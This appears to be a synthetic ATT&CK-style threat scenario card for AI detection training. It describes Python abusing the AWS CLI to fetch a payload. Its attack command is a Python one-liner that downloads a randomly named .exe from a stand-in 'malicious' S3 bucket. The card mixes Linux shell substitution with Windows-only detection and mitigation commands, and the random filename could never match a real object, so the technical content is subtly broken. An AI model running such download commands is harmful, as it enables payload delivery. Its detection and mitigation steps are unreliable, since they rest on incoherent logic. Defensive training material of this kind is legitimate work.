---
type: campaign
scenario_id: 71
tactic: Execution
technique: "T1059.006: Python"
technique_id: T1059.006
tags: [campaign, lotl, execution]
---

# Using Python to abuse cloud CLI (aws) for unauthorized access.

## Threat Description
Using Python to abuse cloud CLI (aws) for unauthorized access.

## Attack Command
```
python -c "import os; os.system('aws s3 cp s3://malicious/$(cat /dev/urandom | tr -dc 'a-z0-9' | head -c 8).exe . --no-sign-request')"
```

## Detection Logic
Monitor aws CLI: `wmic process where name='python.exe' get commandline | findstr aws`; Audit cloud logs: AWS CloudTrail.

## Mitigation
Restrict AWS CLI: `icacls %userprofile%\.aws /deny Everyone:RX`; Require MFA: AWS IAM policies.

## AI Training Prompt
Train AI to detect unauthorized AWS CLI execution and suggest MFA enforcement.

## References
- MITRE ATT&CK T1059.006: https://attack.mitre.org/techniques/T1059/006/
- CWE-78: https://cwe.mitre.org/data/definitions/78.html
